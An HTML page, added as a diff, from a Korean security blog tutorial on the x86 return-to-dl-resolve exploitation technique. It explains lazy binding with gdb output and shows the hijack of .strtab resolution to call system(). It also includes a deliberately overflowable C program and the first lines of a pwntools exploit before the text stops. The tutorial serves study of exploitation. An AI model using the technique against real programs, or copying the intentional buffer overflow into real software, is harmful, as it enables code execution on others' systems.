@@ -1,0 +1,683 @@
+<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Return-to-dl-resolve - x86" /><meta name="author" content="Beomsu Lee" /><meta property="og:locale" content="en_US" /><meta name="description" content="Description" /><meta property="og:description" content="Description" /><link rel="canonical" href="https://beomsu317.github.io/posts/return-to-dl-resolve-x86/" /><meta property="og:url" content="https://beomsu317.github.io/posts/return-to-dl-resolve-x86/" /><meta property="og:site_name" content="BS Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-02-12T00:00:00+09:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Return-to-dl-resolve - x86" /><meta name="twitter:site" content="@" /><meta name="twitter:creator" content="@Beomsu Lee" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Description","url":"https://beomsu317.github.io/posts/return-to-dl-resolve-x86/","@type":"BlogPosting","headline":"Return-to-dl-resolve - x86","dateModified":"2020-02-12T00:00:00+09:00","datePublished":"2020-02-12T00:00:00+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://beomsu317.github.io/posts/return-to-dl-resolve-x86/"},"author":{"@type":"Person","name":"Beomsu Lee"},"@context":"https://schema.org"}</script><title>Return-to-dl-resolve - x86 | BS Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BS Blog"><meta name="application-name" content="BS Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/me.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BS Blog</a></div><div class="site-subtitle font-italic">research & development</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/beomsu317" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['beomsu317','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Return-to-dl-resolve - x86</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Return-to-dl-resolve - x86</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Beomsu Lee </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Feb 12, 2020, 12:00 AM +0900" prep="on" > Feb 12, 2020 <i class="unloaded">2020-02-12T00:00:00+09:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2598 words">14 min</span></div></div><div class="post-content"><h2 id="description">Description</h2><p>프로그램에서 동적 라이브러리 함수의 주소를 찾기 위해 lazy binding을 사용하고 DYNAMIC 섹션에 write 권한이 있을 때 사용가능한 기법이다. ASLR과 DEP를 우회할 수 있다.</p><h3 id="dynamic-linker">Dynamic Linker</h3><p>dynamic linking 방식을 지원하는 프로그램을 실행하면 공유 라이브러리들과 함께 dynamic linker가 메모리에 적재되며 공유라이브러리와 해당 프로그램의 주소공간을 매핑시킬 수 있는 start-up 코드를 가지고 있다.</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="c1">// gcc hello.c -m32 -o hello</span>
+<span class="c1">// Test Code</span>
+<span class="cp">#include &lt;stdio.h&gt;
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="n">puts</span><span class="p">(</span><span class="s">"hello!"</span><span class="p">);</span>
+<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">main()</code> 함수를 disassemble 하면 문자열 출력을 위해 <code class="language-plaintext highlighter-rouge">puts()</code> 함수를 호출하기 위해 <code class="language-plaintext highlighter-rouge">puts@plt</code>를 호출한다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>...
+0x804841f &lt;main+20&gt;:    push   0x80484c0
+=&gt; 0x8048424 &lt;main+25&gt;: call   0x80482e0 &lt;puts@plt&gt;
+0x8048429 &lt;main+30&gt;:    add    esp,0x10
+...
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">puts@plt</code>의 첫 명령은 puts 함수의 GOT를 참조해 점프하는 부분이다. dynamic linker가 한 번도 수행되지 않은 초기에는 got에 plt + 6(0x80482e6) 주소가 있다. 이 부분부터 dynamic linker로 진입하는 부분이며, plt + 6에서는 reloc_offset(0x0)을 push하고 0x80482d0로 분기한다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>...
+=&gt; 0x80482e0 &lt;puts@plt&gt;:    jmp    DWORD PTR ds:0x804a00c
+| 0x80482e6 &lt;puts@plt+6&gt;:   push   0x0
+| 0x80482eb &lt;puts@plt+11&gt;:  jmp    0x80482d0
+...
+gdb-peda$ x/x 0x804a00c
+0x804a00c:  0x080482e6
+</pre></table></code></div></div><p>공유 라이브러리 정보를 담고 있는 <code class="language-plaintext highlighter-rouge">link_map</code> 구조체의 주소(0xf7ffd918)를 push하고 0x804a008(got + 8)에 있는 값(<code class="language-plaintext highlighter-rouge">_dl_runtime_resolve</code>)으로 분기한다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>gdb-peda$ elfheader .got.plt
+.got.plt: 0x804a000 - 0x804a014 (data)
+...
+=&gt; 0x80482d0:   push   DWORD PTR ds:0x804a004
+0x80482d6:  jmp    DWORD PTR ds:0x804a008
+...
+gdb-peda$ x/x 0x804a004
+0x804a004:  0xf7ffd918  &lt;--- link_map 구조체
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">_dl_runtime_resolve()</code> 함수는 push된 두 값(0x0, 0xf7ffd918)을 인자로 <code class="language-plaintext highlighter-rouge">_dl_fixup()</code> 함수를 호출한다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>0xf7fedfe0: push   eax
+=&gt; 0xf7fedfe1:  push   ecx
+0xf7fedfe2: push   edx
+0xf7fedfe3: mov    edx,DWORD PTR [esp+0x10]   &lt;--- 0x0
+0xf7fedfe7: mov    eax,DWORD PTR [esp+0xc]    &lt;--- 0xf7ffd918
+0xf7fedfeb: call   0xf7fe77e0                 &lt;--- call _dl_fixup()
+</pre></table></code></div></div><p><strong><code class="language-plaintext highlighter-rouge">Elf32_Rel</code> 구조체</strong></p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="k">typedef</span> <span class="kt">uint32_t</span> <span class="n">Elf32_Word</span><span class="p">;</span>
+<span class="k">typedef</span> <span class="kt">uint32_t</span> <span class="n">Elf32_Addr</span><span class="p">;</span>
+
+<span class="cm">/* Relocation table entry without addend (in section of type SHT_REL).  */</span>
+<span class="k">typedef</span> <span class="k">struct</span>
+<span class="p">{</span>
+<span class="n">Elf32_Addr</span>        <span class="n">r_offset</span><span class="p">;</span>                <span class="cm">/* Address */</span>
+<span class="n">Elf32_Word</span>        <span class="n">r_info</span><span class="p">;</span>                  <span class="cm">/* Relocation type and symbol index */</span>
+<span class="p">}</span> <span class="n">Elf32_Rel</span><span class="p">;</span>
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">_dl_fixup()</code>에서 <code class="language-plaintext highlighter-rouge">[ecx+0x4]</code>에 재배치 테이블의 시작점인 <code class="language-plaintext highlighter-rouge">JMPREL</code>의 주소를 얻어오는데 이것은 <code class="language-plaintext highlighter-rouge">Elf32_Rel</code> 형식의 구조체들로 이루어져 있다. 8 byte 구조체 형식인 <code class="language-plaintext highlighter-rouge">Elf32_Rel</code> 구조체의 처음 4 byte는 got의 주소 다음 4 byte의 첫 번째 1 byte는 재배치 타입, 두 번째부터 네 번째 byte가 <code class="language-plaintext highlighter-rouge">.dynsym</code> 테이블에서의 인덱스를 나타낸다. <code class="language-plaintext highlighter-rouge">[ecx+0x4]</code>와 <code class="language-plaintext highlighter-rouge">edx</code>와 값을 더하고 있는데, <code class="language-plaintext highlighter-rouge">edx</code>에는 <code class="language-plaintext highlighter-rouge">reloc_offset</code>이었던 0x0이 들어있다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>...
+0xf7fe77fa: mov    DWORD PTR [esp+0x8],esi
+=&gt; 0xf7fe77fe:  add    edx,DWORD PTR [ecx+0x4] 
+0xf7fe7801: mov    eax,DWORD PTR [eax+0x4]
+...
+gdb-peda$ x/x $ecx+0x4
+0x8049f98:  0x08048298  &lt;--- JMPREL
+gdb-peda$ x/2wx 0x08048298
+0x8048298:  0x0804a00c  0x00000107 
+gdb-peda$ 
+0x80482a0:  0x0804a010  0x00000307
+</pre></table></code></div></div><p>index 0x1, 재배치 타입 0x7.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>gdb-peda$ x/2wx 0x08048298 + 0x0
+0x8048298:  0x0804a00c  0x00000107 
+gdb-peda$ x/x 0x0804a00c 
+0x804a00c:  0x080482e6
+gdb-peda$ x/x 0x080482e6
+0x80482e6 &lt;puts@plt+6&gt;: 0x00000068 
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">_dl_fixup()</code> 함수에서 <code class="language-plaintext highlighter-rouge">.dynsym</code> + 0x50에 저장되어있는 <code class="language-plaintext highlighter-rouge">.strtab</code> 섹션의 주소를 가져오고 <code class="language-plaintext highlighter-rouge">.strtab</code> 섹션 내 있는 함수명 <code class="language-plaintext highlighter-rouge">puts</code>의 Offset(0x1a)을 얻어 두 값을 더해 호출할 함수명이 있는 메모리주소를 구하게 된다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>...
+0xf7fe77fa: mov    DWORD PTR [esp+0x8],esi
+0xf7fe77fe: add    edx,DWORD PTR [ecx+0x4]
+=&gt; 0xf7fe7801:  mov    eax,DWORD PTR [eax+0x4]    &lt;--- dynsym의 .strtab 섹션 주소
+0xf7fe7804: mov    ecx,DWORD PTR [edi+0x38]
+0xf7fe7807: mov    DWORD PTR [esp+0xc],eax
+...
+gdb-peda$ x/24wx $eax+0x4
+0x8049f58:  0x0804821c
+gdb-peda$ x/8s 0x0804821c
+0x804821c:  ""
+0x804821d:  "libc.so.6"
+0x8048227:  "_IO_stdin_used"
+0x8048236:  "puts"
+0x804823b:  "__libc_start_main"
+0x804824d:  "__gmon_start__"
+0x804825c:  "GLIBC_2.0"
+0x8048266:  ""
+</pre></table></code></div></div><p>index가 <code class="language-plaintext highlighter-rouge">.dynsym</code> 테이블의 index(0x1)이므로 0x80481dc가 puts의 index이다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>gdb-peda$ elfheader .dynsym
+.dynsym: 0x80481cc - 0x804821c (rodata)
+gdb-peda$ x/24wx 0x80481cc
+0x80481cc:  0x00000000  0x00000000  0x00000000  0x00000000
+0x80481dc:  0x0000001a  0x00000000  0x00000000  0x00000012 &lt;--- puts
+0x80481ec:  0x00000031  0x00000000  0x00000000  0x00000020
+0x80481fc:  0x0000001f  0x00000000  0x00000000  0x00000012
+0x804820c:  0x0000000b  0x080484bc  0x00000004  0x00100011 
+0x804821c:  0x62696c00  0x6f732e63  0x5f00362e  0x735f4f49 &lt;--- .strtab
+</pre></table></code></div></div><p>Elf32_Sym 구조체</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="k">typedef</span> <span class="kt">uint16_t</span> <span class="n">Elf32_Section</span><span class="p">;</span>
+<span class="cm">/* Symbol table entry.  */</span>
+<span class="k">typedef</span> <span class="k">struct</span>
+<span class="p">{</span>
+<span class="n">Elf32_Word</span>        <span class="n">st_name</span><span class="p">;</span>                <span class="cm">/* Symbol name (string tbl index) */</span>
+<span class="n">Elf32_Addr</span>        <span class="n">st_value</span><span class="p">;</span>                <span class="cm">/* Symbol value */</span>
+<span class="n">Elf32_Word</span>        <span class="n">st_size</span><span class="p">;</span>                <span class="cm">/* Symbol size */</span>
+<span class="kt">unsigned</span> <span class="kt">char</span>        <span class="n">st_info</span><span class="p">;</span>                <span class="cm">/* Symbol type and binding */</span>
+<span class="kt">unsigned</span> <span class="kt">char</span>        <span class="n">st_other</span><span class="p">;</span>                <span class="cm">/* Symbol visibility */</span>
+<span class="n">Elf32_Section</span>        <span class="n">st_shndx</span><span class="p">;</span>                <span class="cm">/* Section index */</span>
+<span class="p">}</span> <span class="n">Elf32_Sym</span><span class="p">;</span>
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">.dynsym</code> 테이블은 <code class="language-plaintext highlighter-rouge">Elf32_Sym</code>구조체(4 byte 6개)로 이루어져 있는데 중요한 값은 첫 번째와 다섯 번째 값이다. 첫 번째는 함수 이름 위치의 offset이고, 다섯 번째는 3과 &amp;연산을 하여 0이냐 아니냐로 로딩된 함수인지 판단한다. 결과가 0이 아니라면 이미 로딩된 함수라고 판단하고 바로 호출한다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>0x0000001a, 0x00000000, 0x00000000, 0x00, 0x00, 0x0012
+</pre></table></code></div></div><p>.strtab에 0x1a를 더하면 “puts” 문자열이다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>gdb-peda$ x/s 0x80481cc + 0x50 + 0x1a
+0x8048236:  "puts"
+</pre></table></code></div></div><p>이렇게 알아낸 문자열을 <code class="language-plaintext highlighter-rouge">eax</code> 레지스터에 넣고 <code class="language-plaintext highlighter-rouge">_dl_lookup_symbol_x()</code> 함수를 호출한다. 해당 함수가 종료되면 <code class="language-plaintext highlighter-rouge">eax</code>에 라이브러리의 시작 주소가 쓰여있다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>[----------------------------------registers-----------------------------------]
+EAX: 0x8048236 ("puts")
+[-------------------------------------code-------------------------------------]
+0xf7fe7895: mov    edx,edi
+0xf7fe7897: push   DWORD PTR [edi+0x1cc]
+=&gt; 0xf7fe789d:  call   0xf7fe2a60   &lt;--- _dl_lookup_symbol_x()
+0xf7fe78a2: mov    edi,eax
+[------------------------------------------------------------------------------]
+</pre></table></code></div></div><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>...
+0xf7fe78af: jne    0xf7fe7918
+0xf7fe78b1: mov    ebx,DWORD PTR [esp+0x1c] &lt;--- [esp+0x1c]를 ebx에 넣고
+0xf7fe78b5: test   ebx,ebx
+0xf7fe78b7: je     0xf7fe79
+...
+0xf7fe78bd: mov    eax,DWORD PTR [edi] &lt;--- edi(라이브러리 시작 주소)를 eax에 넣고
+0xf7fe78bf: movzx  edx,BYTE PTR [ebx+0xc]
+0xf7fe78c3: add    eax,DWORD PTR [ebx+0x4] &lt;--- [ebx+0x4](puts offset)와 eax를 더한다.
+...
+[----------------------------------registers-----------------------------------]
+EAX: 0xf7e64140 (&lt;puts&gt;:    push   ebp) &lt;--- eax에 puts의 got 주소
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">puts()</code> 함수의 plt에 got가 기록된다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>gdb-peda$ x/3i 0x80482e0
+0x80482e0 &lt;puts@plt&gt;:   jmp    DWORD PTR ds:0x804a00c
+0x80482e6 &lt;puts@plt+6&gt;: push   0x0
+0x80482eb &lt;puts@plt+11&gt;:    jmp    0x80482d0
+gdb-peda$ x/x 0x804a00c
+0x804a00c:  0xf7e64140
+</pre></table></code></div></div><h3 id="modulate-strtab">Modulate .strtab</h3><p><code class="language-plaintext highlighter-rouge">.dynsym</code>에 쓰기 권한이 있다면 <code class="language-plaintext highlighter-rouge">.dynsym</code> 영역에 있는 <code class="language-plaintext highlighter-rouge">.strtab</code> 포인터를 write 권한이 있는 다른 메모리 주소를 가리키도록 하고, 기존의 <code class="language-plaintext highlighter-rouge">.strtab</code>과 함수명과 offset을 더한 곳에 원하는 함수명을 입력하면 해당 함수가 실행된다. <code class="language-plaintext highlighter-rouge">.bss</code>영역에 offset(0x1a)를 더한 부분에 <code class="language-plaintext highlighter-rouge">system</code> 문자열을 입력한다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>gdb-peda$ elfheader .bss
+.bss: 0x804a01c - 0x804a020 (data)
+gdb-peda$ set *(0x804a01c + 0x50 + 0x1a)=0x74737973
+gdb-peda$ set *(0x804a01c + 0x50 + 0x1a + 0x4)=0x00006d65
+gdb-peda$ x/24wx 0x804a01c
+0x804a01c &lt;completed.7209&gt;: 0x00000000  0x00000000  0x00000000  0x00000000
+0x804a02c:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804a03c:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804a04c:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804a05c:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804a06c:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804a07c:  0x00000000  0x00000000  0x79730000  0x6d657473
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">.dynamic</code> 영역에 <code class="language-plaintext highlighter-rouge">.strtab</code>을 가리키는 포인터가 존재하는데 이 부분을 <code class="language-plaintext highlighter-rouge">.bss</code> 영역으로 덮어쓴다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>gdb-peda$ x/24wx 0x8049f14 + 0x44
+0x8049f58:  0x0804821c
+gdb-peda$ set *(0x8049f14 + 0x44) = 0x804a01c + 0x50
+</pre></table></code></div></div><p>system에 breakpoint를 걸고 continue를 하면 system 함수가 호출된다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>gdb-peda$ b system
+Breakpoint 2 at 0xf7e41940
+gdb-peda$ c
+Continuing.
+...
+[-------------------------------------code-------------------------------------]
+0xf7e41936: ret    
+0xf7e41937: mov    esi,esi
+0xf7e41939: lea    edi,[edi+eiz*1+0x0]
+=&gt; 0xf7e41940 &lt;system&gt;: sub    esp,0xc
+0xf7e41943 &lt;system+3&gt;:  mov    eax,DWORD PTR [esp+0x10]
+0xf7e41947 &lt;system+7&gt;:  call   0xf7f2428d
+0xf7e4194c &lt;system+12&gt;: add    edx,0x1756b4
+0xf7e41952 &lt;system+18&gt;: test   eax,eax
+</pre></table></code></div></div><h2 id="proof-of-concept">Proof of concept</h2><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="c1">// Vuln Code</span>
+<span class="c1">// gcc -fno-stack-protector -o rop rop.c -m32</span>
+<span class="cp">#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+</span>  
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">512</span><span class="p">);</span>
+<span class="p">}</span>
+  
+<span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"Hello ROP</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
+    <span class="n">vuln</span><span class="p">();</span>
+<span class="p">}</span>
+</pre></table></code></div></div><h2 id="exploit-code">Exploit code</h2><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+</pre><td class="rouge-code"><pre><span class="o">//</span> <span class="n">Exploit</span> <span class="n">Code</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./rop'</span><span class="p">)</span>
